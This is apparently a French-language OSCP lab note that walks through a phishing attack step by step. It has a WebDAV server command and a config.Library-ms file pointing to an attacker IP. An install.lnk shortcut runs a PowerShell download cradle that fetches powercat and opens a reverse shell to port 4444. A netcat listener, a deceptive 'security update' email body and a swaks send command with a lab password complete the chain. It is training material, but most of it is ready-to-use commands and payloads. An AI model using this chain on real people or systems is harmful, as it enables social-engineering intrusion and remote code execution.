Si on a accès à un serveur d'email, on peut envoyer un email :

# Méthode d'attaque
## 1 - Lancer un serveur webdav dans le dossier webdav qui contient les fichiers config.Library-ms et install.lnk

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root "/home/kali/Documents/OSC-2024/Partage_Kali/OSCP-2024/Exercices/27.1.1 Assembling the pieces/webdav/"

```

## 2 - créer un fichier config.Library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.205</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

## 3 - Créer un lien sur le bureau d'une machine windows ayant pour nom install.lnk

Créer le lien sur une machine windows avec en exécution :
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.155:8000/powercat.ps1'); powercat -c 192.168.45.155 -p 4444 -e powershell"
```

## 4 - copier powercat.ps1 dans le dossier d'attaque

```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```
On lance un serveur python :
```
python3 -m http.server 8000
```
ou
```
python3 -m uploadserver 8000 
```

On demarre une console :
```
nc -nvlp 4444
```

## 5 - Création du corp de l'email dans body.txt
body.txt est le corp du message avec par exemple :
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

## 6 - On envoi l'email
```
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @./webdav/config.Library-ms --server 192.168.226.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
[sudo] Mot de passe de kali : 
Username: john
Password: dqsTwTpZPn#nL

```

ici, c'est un attaque avec un fichier de configuration /webdav/config.Library-ms que l'on va joindre à l'email .


l'adresse est celle de Kali (qui aura lancé un serveur webdav, python et nc)


john / dqsTwTpZPn#nL sont les infos d'accès de john sur ce serveur 
